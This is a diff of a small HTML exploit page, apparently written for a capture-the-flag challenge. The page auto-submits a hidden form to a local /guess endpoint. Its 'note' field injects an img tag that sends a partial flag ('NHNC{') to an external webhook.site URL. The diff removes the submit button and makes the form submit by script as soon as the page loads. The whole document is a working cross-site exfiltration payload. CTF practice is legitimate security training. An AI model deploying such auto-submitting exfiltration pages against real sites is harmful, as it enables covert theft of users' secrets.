@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <form action="http://127.0.0.1:5000/guess" method="POST">
+  <form id="xssform" action="http://127.0.0.1:5000/guess" method="POST">
     <input type="hidden" name="guess" value="NHNC{">
     <input type="hidden" name="note" value='<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">'>
-    <input type="submit" value="Submit">
   </form>
+
   <script>
-    document.forms[0].submit();
+    document.getElementById('xssform').submit();
   </script>
 </body>
 </html>
